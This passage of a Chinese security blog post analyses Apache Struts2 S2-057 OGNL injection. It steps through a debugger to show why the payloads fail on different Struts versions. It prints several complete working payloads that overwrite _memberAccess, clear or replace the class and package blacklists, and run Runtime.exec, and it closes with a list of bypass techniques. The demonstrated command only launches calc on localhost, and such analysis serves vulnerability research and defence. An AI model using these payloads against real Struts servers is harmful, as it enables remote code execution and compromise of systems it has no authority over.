+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setMemberAccess</span><span class="params">(MemberAccess value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (value == <span class="keyword">null</span>) &#123; <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">&quot;cannot set MemberAccess to null&quot;</span>); &#125;</span><br><span class="line">    _memberAccess = value;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>保留属性和<code>_values</code>一起组成如下图</p>
+<p><img src="https://image.lufe1.cn/struts2%E6%BC%8F%E6%B4%9Eexp%E5%88%86%E6%9E%90/1.png"></p>
+<h2 id="3、单步调试ognl表达式"><a href="#3、单步调试ognl表达式" class="headerlink" title="3、单步调试ognl表达式"></a>3、单步调试ognl表达式</h2><p>为了调试的方便，确认表达式哪步成功哪步不成功，所以要找能够观察每个表达式结果的地方。由于要再执行真正的表示之前要对参数进行调整、检测表达式。所以到真正执行之前调用之前有几层栈。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ASTChain.getValueBody(OgnlContext, Object) line: <span class="number">141</span>    </span><br><span class="line">ASTChain(SimpleNode).evaluateGetValueBody(OgnlContext, Object) line: <span class="number">212</span>    </span><br><span class="line">ASTChain(SimpleNode).getValue(OgnlContext, Object) line: <span class="number">258</span>    </span><br><span class="line">Ognl.getValue(Object, Map, Object, Class) line: <span class="number">494</span>    </span><br><span class="line">Ognl.getValue(String, Map, Object, Class) line: <span class="number">596</span>    </span><br><span class="line">Ognl.getValue(String, Map, Object) line: <span class="number">566</span>    </span><br><span class="line">Temp.main(String[]) line: <span class="number">48</span>    </span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>真正调用是在<code>ASTChain.getValueBody</code>函数之中，里面有<code>for循环</code>是一个重要标识，通过遍历执行所有表达式。</p>
+<p><img src="https://image.lufe1.cn/struts2%E6%BC%8F%E6%B4%9Eexp%E5%88%86%E6%9E%90/2.png"></p>
+<h2 id="4、-struts2环境下的OgnlContext"><a href="#4、-struts2环境下的OgnlContext" class="headerlink" title="4、 struts2环境下的OgnlContext"></a>4、 struts2环境下的OgnlContext</h2><p>那么struts2框架会给OgnlContext设置哪些context和root?</p>
+<p><img src="https://image.lufe1.cn/struts2%E6%BC%8F%E6%B4%9Eexp%E5%88%86%E6%9E%90/3.png"></p>
+<p>这个HashMap中存在链表，如上图所示，所以想了解所有内容，需要点开HashMap中的next查看。<br><code>_root</code> 里面存储着着Struts2 ActionContext，值为Test，说明访问的是Test Action。<br><code>_value</code> 里面存储着session，parameters等ValueStack内容。</p>
+<h1 id="0x02-S2-057exp分析"><a href="#0x02-S2-057exp分析" class="headerlink" title="0x02 S2-057exp分析"></a>0x02 S2-057exp分析</h1><p>以S2-057的exp为列进行分析，S2-057可以分成三个版本。</p>
+<h2 id="1、第一个最简单的版本"><a href="#1、第一个最简单的版本" class="headerlink" title="1、第一个最简单的版本"></a>1、第一个最简单的版本</h2><p>最简单的版本是以<code>struts-2.3.24</code>为列。<br>打开如下url，选用弹出计算器的exp，比较容易观察是否执行成功，是否跑飞了。<br><code>http://127.0.0.1:8070/Test/$&#123;(%23cmd=@java.lang.Runtime@getRuntime().exec(&quot;calc&quot;))&#125;/test</code></p>
+<p>下面的表达式与开始的helloworld不同的是，这里多了<code>$&#123;&#125;</code>，因为<br><code>xwork-core\src\main\java\com\opensymphony\xwork2\util\OgnlTextParser.java evaluate</code>,<br>是以<code>$</code>或<code>%</code>作为限定符进行解析。</p>
+<p><img src="https://image.lufe1.cn/struts2%E6%BC%8F%E6%B4%9Eexp%E5%88%86%E6%9E%90/4.png"></p>
+<p>我们期待的计算器并没有弹出。这时候<code>动态调试+开发者模式</code>的好处显示出来了，在console打印了</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">十月 09, <span class="number">2018</span> <span class="number">9</span>:<span class="number">29</span>:<span class="number">36</span> 下午 com.opensymphony.xwork2.ognl.SecurityMemberAccess warn</span><br><span class="line">警告: Target <span class="class"><span class="keyword">class</span> [<span class="title">class</span> <span class="title">java</span>.<span class="title">lang</span>.<span class="title">Runtime</span>] <span class="title">is</span> <span class="title">excluded</span>!</span></span><br></pre></td></tr></table></figure>
+
+<p>对<code>SecurityMemberAccess</code>类中弹出警告信息地方进行下断点，看到上一层<code>isMethodAccessible</code>会根据<code>context</code>的<code>_memberAccess</code>对象，调用相应对象的<code>isAccessible</code>方法，可以看到这里调用的是<code>com.opensymphony.xwork2.ognl.SecurityMemberAccess</code>类的<code>isAccessible</code>方法。</p>
+<p><img src="https://image.lufe1.cn/struts2%E6%BC%8F%E6%B4%9Eexp%E5%88%86%E6%9E%90/5.png"></p>
+<p>可以将<code>_memberAccess</code>中的<code>com.opensymphony.xwork2.ognl.SecurityMemberAccess</code>对象覆盖成<code>ognl.DefaultMemberAccess</code>，因为<code>xwork2</code>自身对<code>ognl</code>的安全访问类的一些方法进行了重写，实现了自己的权限控制防护。但是<code>ognl</code>从helloworld看到是可以执行命令，没有防护。</p>
+<p><img src="https://image.lufe1.cn/struts2%E6%BC%8F%E6%B4%9Eexp%E5%88%86%E6%9E%90/6.png"></p>
+<p>在S2-057中，struts-2.3.24的exp如下。<br><code>http://127.0.0.1:8070/Test/%25&#123;(%23_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(%23cmd=@java.lang.Runtime@getRuntime().exec(&quot;calc&quot;))&#125;/test</code></p>
+<p>经过测试<code>2.3.20~2.3.29</code>都是可以用</p>
+<h2 id="2、第二个版本"><a href="#2、第二个版本" class="headerlink" title="2、第二个版本"></a>2、第二个版本</h2><p>范围是：2.3.30~2.5.10，以<code>struts-2.3.30</code>为列。<br>执行上面的exp还是会报<code>class [class java.lang.Runtime] is excluded!</code>，和之前的结果<code>对比</code>一下，通过下面的截图可以看到<code>_memberAccess</code>还是<code>com.opensymphony.xwork2.ognl.SecurityMemberAccess</code>，不过在<code>_value</code>中增加了<code>_memberAccess=ognl.DefaultMemberAccess@5d6edd4f</code>。</p>
+<p><img src="https://image.lufe1.cn/struts2%E6%BC%8F%E6%B4%9Eexp%E5%88%86%E6%9E%90/7.png"></p>
+<p>那我们单步跟踪一下（这里单步调试毕竟多，可以通过栈的刷新速度和右边的变量重新还原到上次跑飞的地方），这个覆盖为什么没有成功。通过单步跟踪发现，<code>ognl</code>并没有将<code>_memberAccess</code>纳入<code>RESERVED_KEYS</code> Map中，导致被当成普通的属性进行赋值了。</p>
+<p><img src="https://image.lufe1.cn/struts2%E6%BC%8F%E6%B4%9Eexp%E5%88%86%E6%9E%90/8.png"></p>
+<p>这里不能直接<code>#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS</code>进行对象覆盖，<code>OgnlValueStack</code>使用<code>OgnlUtil.createDefaultContext</code>进行创建<code>_memberAccess</code>默认属性，以及<code>OgnlUtil.excludedClasses、excludedPackageNamePatterns、excludedPackageNames</code>存储着黑名单，不过<code>com.opensymphony.xwork2.ognl.OgnlUtil.getExcludedxxxxx()</code>能够获取到这些私有属性集合。</p>
+<p>为了获取到<code>OgnlUtil</code>对象，使用了<code>com.opensymphony.xwork2.inject.ContainerImpl.getInstance</code>进行实例化。</p>
+<p><img src="https://image.lufe1.cn/struts2%E6%BC%8F%E6%B4%9Eexp%E5%88%86%E6%9E%90/9.png"></p>
+<p>获取<code>OgnlUtil</code>对象后，然后clear方法将黑名单清除掉。如果直接调用<code>setMemberAccess</code>会检测包<code>ognl</code>在黑名单中。最终exp如下</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;(%23dm=<span class="meta">@ognl</span>.OgnlContext<span class="meta">@DEFAULT_MEMBER_ACCESS</span>).(%23cr=%23context[<span class="string">&#x27;com.opensymphony.xwork2.ActionContext.container&#x27;</span>]).(%23ou=%23cr.getInstance(<span class="meta">@com</span>.opensymphony.xwork2.ognl.OgnlUtil<span class="meta">@class</span>)).(%23ou.getExcludedPackageNames().clear()).(%23ou.getExcludedClasses().clear()).(%23context.setMemberAccess(%23dm)).(%23cmd=<span class="meta">@java</span>.lang.Runtime<span class="meta">@getRuntime()</span>.exec(<span class="string">&quot;calc&quot;</span>))&#125;</span><br></pre></td></tr></table></figure>
+
+<p><code>struts-2.3.34</code>这个版本是一个异数，使用上面的exp无法弹出计算器。<br>通过单步调试发现，<code>get</code>方法无法获取到保留属性<code>context</code>，因为在这个版本中，<code>ognl</code>移除了<code>context</code>属性，不在作为保留属性。所以导致无法获取到<code>context</code>。<br><img src="https://image.lufe1.cn/struts2%E6%BC%8F%E6%B4%9Eexp%E5%88%86%E6%9E%90/10.png"></p>
+<p>这样无法直接通过<code>#</code>获取到<code>context</code>，但是可以从<code>request[&#39;struts.valueStack&#39;]</code>获取到<code>com.opensymphony.xwork2.ognl.OgnlValueStack.context</code>。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">request=&#123;struts.valueStack=com.opensymphony.xwork2.ognl.OgnlValueStack@3923c6df, struts.actionMapping=ActionMapping&#123;name=<span class="string">&#x27;test&#x27;</span>, namespace=<span class="string">&#x27;/$&#123;(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#cr=#context[&#x27;</span>com.opensymphony.xwork2.ActionContext.container<span class="string">&#x27;]).(#ou=#cr.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ou.getExcludedPackageNames().clear()).(#ou.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)).(#cmd=@java.lang.Runtime@getRuntime().exec(&quot;calc&quot;))&#125;&#x27;</span>, method=<span class="string">&#x27;null&#x27;</span>, extension=<span class="string">&#x27;null&#x27;</span>, params=<span class="keyword">null</span>, result=<span class="keyword">null</span>&#125;, __cleanup_recursion_counter=<span class="number">1</span>&#125;</span><br></pre></td></tr></table></figure>
+
+<p>所以exp为</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;(%23dm=<span class="meta">@ognl</span>.OgnlContext<span class="meta">@DEFAULT_MEMBER_ACCESS</span>).(%23ct=%23request[<span class="string">&#x27;struts.valueStack&#x27;</span>].context).(%23cr=%23ct[<span class="string">&#x27;com.opensymphony.xwork2.ActionContext.container&#x27;</span>]).(%23ou=%23cr.getInstance(<span class="meta">@com</span>.opensymphony.xwork2.ognl.OgnlUtil<span class="meta">@class</span>)).(%23ou.getExcludedPackageNames().clear()).(%23ou.getExcludedClasses().clear()).(%23ct.setMemberAccess(%23dm)).(%23cmd=<span class="meta">@java</span>.lang.Runtime<span class="meta">@getRuntime()</span>.exec(<span class="string">&quot;calc&quot;</span>))&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="3、第三个版本"><a href="#3、第三个版本" class="headerlink" title="3、第三个版本"></a>3、第三个版本</h2><p>第三个版本范围是<code>2.5.12~2.5.16</code>，以<code>struts-2.5.12</code>版本为列。2.5以上的版本是把xwork2合并到struts2-core-x-x-xx.jar中了，在配置漏洞的环境的时候要注意一点，需要修改/WEB-INF/web.xml。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;filter-<span class="class"><span class="keyword">class</span>&gt;<span class="title">org</span>.<span class="title">apache</span>.<span class="title">struts2</span>.<span class="title">dispatcher</span>.<span class="title">ng</span>.<span class="title">filter</span>.<span class="title">StrutsPrepareAndExecuteFilter</span>&lt;/<span class="title">filter</span>-<span class="title">class</span>&gt;</span></span><br><span class="line"><span class="class">改成</span></span><br><span class="line"><span class="class">&lt;<span class="title">filter</span>-<span class="title">class</span>&gt;<span class="title">org</span>.<span class="title">apache</span>.<span class="title">struts2</span>.<span class="title">dispatcher</span>.<span class="title">filter</span>.<span class="title">StrutsPrepareAndExecuteFilter</span>&lt;/<span class="title">filter</span>-<span class="title">class</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>使用上一个版本的exp发现没有弹出计算器，爆出如下信息，通过notepad++搜索源码，发现是在<code>ognl/OgnlRuntime.java</code>，进行下断点。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Two methods with same method signature but not providing classes assignable? <span class="string">&quot;public abstract void java.util.Set.clear()&quot;</span> and <span class="string">&quot;public void java.util.Collections$UnmodifiableCollection.clear()&quot;</span> please report!</span><br></pre></td></tr></table></figure>
+
+<p>先断点后跟下去，发现最后发现是调用了<code>clear</code>清除<code>Collections$UnmodifiableSet ExcludedClasses</code>，导致<code>ExcludedClasses</code>这些黑名单并没有被清除掉。</p>
+<p><img src="https://image.lufe1.cn/struts2%E6%BC%8F%E6%B4%9Eexp%E5%88%86%E6%9E%90/11.png"></p>
+<p>但是<code>OgnlUtil.setExcludedClasses</code>函数是对<code>excludedClasses</code>重新赋给一个新集合，并不是修改，所以我们赋值一个包含关紧要的类的黑名集合，从而达到了绕过。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setExcludedClasses</span><span class="params">(String commaDelimitedClasses)</span> </span>&#123;</span><br><span class="line">    Set&lt;String&gt; classNames = TextParseUtil.commaDelimitedStringToSet(commaDelimitedClasses);</span><br><span class="line">    Set&lt;Class&lt;?&gt;&gt; classes = <span class="keyword">new</span> HashSet&lt;&gt;();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (String className : classNames) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            classes.add(Class.forName(className));</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> ConfigurationException(<span class="string">&quot;Cannot load excluded class: &quot;</span> + className, e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    excludedClasses = Collections.unmodifiableSet(classes);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>所以最终exp如下</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;(%23dm=<span class="meta">@ognl</span>.OgnlContext<span class="meta">@DEFAULT_MEMBER_ACCESS</span>).(%23ct=%23request[<span class="string">&#x27;struts.valueStack&#x27;</span>].context).(%23cr=%23ct[<span class="string">&#x27;com.opensymphony.xwork2.ActionContext.container&#x27;</span>]).(%23ou=%23cr.getInstance(<span class="meta">@com</span>.opensymphony.xwork2.ognl.OgnlUtil<span class="meta">@class</span>)).(%23ou.setExcludedClasses(<span class="string">&#x27;java.lang.Shutdown&#x27;</span>)).(%23ou.setExcludedPackageNames(<span class="string">&#x27;sun.reflect.&#x27;</span>)).(%23ct.setMemberAccess(%23dm)).(%23cmd=<span class="meta">@java</span>.lang.Runtime<span class="meta">@getRuntime()</span>.exec(<span class="string">&quot;calc&quot;</span>))&#125;</span><br></pre></td></tr></table></figure>
+
+<p>但是第一次执行上面的exp会报500错误，第二次就不会报错了。</p>
+<p><img src="https://image.lufe1.cn/struts2%E6%BC%8F%E6%B4%9Eexp%E5%88%86%E6%9E%90/12.png"></p>
+<p><img src="https://image.lufe1.cn/struts2%E6%BC%8F%E6%B4%9Eexp%E5%88%86%E6%9E%90/13.png"></p>
+<p><code>ognl.OgnlRuntime.callAppropriateMethod</code>中通过<code>getAppropriateMethod</code>获取到合适的函数，不为空并且通权限的验证，就使用下面的<code>invokeMethod</code>执行<code>ognl</code>表达式里面的函数。这里看到<code>excludedClasses</code>跟默认设置的一样，前面我们不是使用<code>setExcludedClasses</code>设置了一个无关紧要的黑名单了吗？原因是修改的并不是当前<code>context</code>，而是修改的是<code>request[&#39;struts.valueStack&#39;].context</code>，并没有更新到当前<code>context</code>，所以需要再执行一遍，将修改后的跟新到当前<code>context</code>就好了。</p>
+<p>先后执行下面两个exp，就会发现不会报错500。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$&#123;(%23dm=<span class="meta">@ognl</span>.OgnlContext<span class="meta">@DEFAULT_MEMBER_ACCESS</span>).(%23ct=%23request[<span class="string">&#x27;struts.valueStack&#x27;</span>].context).(%23cr=%23ct[<span class="string">&#x27;com.opensymphony.xwork2.ActionContext.container&#x27;</span>]).(%23ou=%23cr.getInstance(<span class="meta">@com</span>.opensymphony.xwork2.ognl.OgnlUtil<span class="meta">@class</span>)).(%23ou.setExcludedClasses(<span class="string">&#x27;java.lang.Shutdown&#x27;</span>)).(%23ou.setExcludedPackageNames(<span class="string">&#x27;sun.reflect.&#x27;</span>))&#125;</span><br><span class="line"></span><br><span class="line">$&#123;(%23dm=<span class="meta">@ognl</span>.OgnlContext<span class="meta">@DEFAULT_MEMBER_ACCESS</span>).(%23ct=%23request[<span class="string">&#x27;struts.valueStack&#x27;</span>].context).(%23ct.setMemberAccess(%23dm)).(%23cmd=<span class="meta">@java</span>.lang.Runtime<span class="meta">@getRuntime()</span>.exec(<span class="string">&quot;calc&quot;</span>))&#125;</span><br></pre></td></tr></table></figure>
+
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>总结一下防护手段：<br>1、添加黑名单<br>2、阉割掉一些属性<br>3、将属性设置私有或者将集合变成不可修改</p>
+<p>总结一下绕过手段：<br>1、最开始覆盖绕过<br><code>%23_memberAccess[&#39;excludedClasses&#39;]=%23_memberAccess[&#39;acceptProperties&#39;]</code><br>2、对象维度的覆盖<br><code>#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS</code><br>3、阉割掉一些属性，找替代品（因为为了开发的方便，会有一些替代品的存在）<br><code>#ct=#request[&#39;struts.valueStack&#39;].context</code><br>4、将属性设置私有或者将集合变成不可修改，找能够改变的方法<br><code>ou.setExcludedClasses(&#39;java.lang.Shutdown&#39;)</code></p>
+<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a target="_blank" rel="noopener" href="https://www.ibm.com/developerworks/cn/opensource/os-cn-ognl/index.html" title="OGNL 语言介绍与实践">OGNL 语言介绍与实践</a><br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/cenyu/p/6233942.html" title="Ognl表达式基本原理和使用方法">Ognl表达式基本原理和使用方法</a><br><a target="_blank" rel="noopener" href="https://juejin.im/post/5aa536af51882555686860f5" title="Struts2【OGNL、valueStack】就是这么简单">Struts2【OGNL、valueStack】就是这么简单</a><br><a target="_blank" rel="noopener" href="http://blog.sina.com.cn/s/blog_7ffb8dd5010141pd.html" title="从调试角度理解ActionContext、OgnlContext、OgnlValueStack的关系">从调试角度理解ActionContext、OgnlContext、OgnlValueStack的关系</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/sxb0841901116/article/details/27358697" title="深入struts2 （一）---Xwork介绍">深入struts2 （一）—Xwork介绍</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/q291611265/article/details/47302225" title="OgnlContext源码分析">OgnlContext源码分析</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/u011721501/article/details/41610157" title="Struts2漏洞分析与研究之Ognl机制探讨">Struts2漏洞分析与研究之Ognl机制探讨</a><br><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2618" title="【Struts2-代码执行漏洞分析系列】S2-057">【Struts2-代码执行漏洞分析系列】S2-057</a></p>
+<h2 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h2><p><a target="_blank" rel="noopener" href="https://archive.apache.org/dist/struts/">https://archive.apache.org/dist/struts/</a></p>
+<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><p><a target="_blank" rel="noopener" href="https://github.com/Fnzer0/S2-057-poc">https://github.com/Fnzer0/S2-057-poc</a><br><a target="_blank" rel="noopener" href="https://github.com/Ivan1ee/struts2-057-exp">https://github.com/Ivan1ee/struts2-057-exp</a></p>
+
+      
+    </div>
+    <div class="article-footer">
+      <blockquote class="mt-2x">
+  <ul class="post-copyright list-unstyled">
+    
+    <li class="post-copyright-link hidden-xs">
+      <strong>本文链接：</strong>
+      <a href="https://lufe1.cn/2018/10/08/struts2%E6%BC%8F%E6%B4%9Eexp%E5%88%86%E6%9E%90/" title="struts2漏洞exp分析" target="_blank" rel="external">https://lufe1.cn/2018/10/08/struts2漏洞exp分析/</a>
+    </li>
+    
+    <li class="post-copyright-license">
+      <strong>版权声明： </strong> 本博客所有文章除特别声明外，均采用 <a href="http://creativecommons.org/licenses/by/4.0/deed.zh" target="_blank" rel="external">CC BY 4.0 CN协议</a> 许可协议。转载请注明出处！
+    </li>
+  </ul>
+</blockquote>
+
+
+<div class="panel panel-default panel-badger">
+  <div class="panel-body">
+    <figure class="media">
+      <div class="media-left">
+        <a href="https://github.com/lufeirider" target="_blank" class="img-burn thumb-sm visible-lg">
+          <img src="/images/avatar.jpg" class="img-rounded w-full" alt="">
+        </a>
+      </div>
+      <div class="media-body">
+        <h3 class="media-heading"><a href="https://github.com/lufeirider" target="_blank"><span class="text-dark">lufei</span><small class="ml-1x">网络安全</small></a></h3>
+        <div>个人简介。</div>
+      </div>
+    </figure>
+  </div>
+</div>
+
+
+    </div>
+  </article>
+  
+    
+  <section id="comments">
+  	
+      <div id="vcomments"></div>
+    
+  </section>
+
+
+  
+</div>
+
+  <nav class="bar bar-footer clearfix" data-stick-bottom>
+  <div class="bar-inner">
+  
+  <ul class="pager pull-left">
+    
+    <li class="prev">
+      <a href="/2018/11/10/sqlmap%E5%A6%82%E4%BD%95%E5%88%A4%E6%96%AD%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B1%BB%E5%9E%8B/" title="sqlmap如何判断数据库类型"><i class="icon icon-angle-left" aria-hidden="true"></i><span>&nbsp;&nbsp;Newer</span></a>
+    </li>
+    
+    
+    <li class="next">
+      <a href="/2018/10/06/%E4%B8%80%E4%B8%AA%E7%AC%A6%E5%8F%B7%E5%85%8D%E6%9D%80%E4%B8%80%E5%8F%A5%E8%AF%9D/" title="一个符号免杀一句话"><span>Older&nbsp;&nbsp;</span><i class="icon icon-angle-right" aria-hidden="true"></i></a>
+    </li>
+    
+    
+  </ul>
+  
+  
+  
+  <div class="bar-right">
+    
+    <div class="share-component" data-sites="weibo,qq,wechat,facebook,twitter" data-mobile-sites="weibo,qq,qzone"></div>
+    
+  </div>
+  </div>
+</nav>
+  
+
+
+</main>
+
+  <footer class="footer" itemscope itemtype="http://schema.org/WPFooter">
+	
+	
+    <ul class="social-links">
+    	
+        <li><a href="https://github.com/lufeirider" target="_blank" title="Github" data-toggle=tooltip data-placement=top><i class="icon icon-github"></i></a></li>
+        
+        <li><a href="http://weibo.com/lufeirider" target="_blank" title="Weibo" data-toggle=tooltip data-placement=top><i class="icon icon-weibo"></i></a></li>
+        
+        <li><a href="https://twitter.com/lufeirider" target="_blank" title="Twitter" data-toggle=tooltip data-placement=top><i class="icon icon-twitter"></i></a></li>
+        
+        <li><a href="https://www.behance.net/lufeirider" target="_blank" title="Behance" data-toggle=tooltip data-placement=top><i class="icon icon-behance"></i></a></li>
+        
+        <li><a href="/atom.xml" target="_blank" title="Rss" data-toggle=tooltip data-placement=top><i class="icon icon-rss"></i></a></li>
+        
+    </ul>
+
+    <div class="copyright">
+    	
+        &copy; 2021 lufei@湘ICP备17016147号-1
+        
+        <div class="publishby">
+        	
+        </div>
+    </div>
+</footer>
+  <script src="//cdn.jsdelivr.net/npm/jquery@1.12.4/dist/jquery.min.js"></script>
+<script>
+window.jQuery || document.write('<script src="js/jquery.min.js"><\/script>')
+</script>
+
+<script src="/js/plugin.min.js"></script>
+
+
+<script src="/js/application.js"></script>
+
+
+    <script>
+(function (window) {
+    var INSIGHT_CONFIG = {
+        TRANSLATION: {
+            POSTS: 'Posts',
+            PAGES: 'Pages',
+            CATEGORIES: 'Categories',
+            TAGS: 'Tags',
+            UNTITLED: '(Untitled)',
+        },
+        ROOT_URL: '/',
+        CONTENT_URL: '/content.json',
+    };
+    window.INSIGHT_CONFIG = INSIGHT_CONFIG;
+})(window);
+</script>
+
+<script src="/js/insight.js"></script>
+
+
+
+
+
+
+   
+
+
+
+
+   
+    
+  <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/valine"></script>
+  <script type="text/javascript">
+  var GUEST = ['nick', 'mail', 'link'];
+  var meta = 'nick,mail,link';
+  meta = meta.split(',').filter(function(item) {
+    return GUEST.indexOf(item) > -1;
+  });
+  new Valine({
+    el: '#vcomments',
+    verify: false,
+    notify: false,
+    appId: '',
+    appKey: '',
+    placeholder: 'Just go go',
+    avatar: 'mm',
+    meta: meta,
+    pageSize: '10' || 10,
+    visitor: false
+  });
+  </script>
+
+     
+
+
+
+
+
+
+
+</body>
+</html>
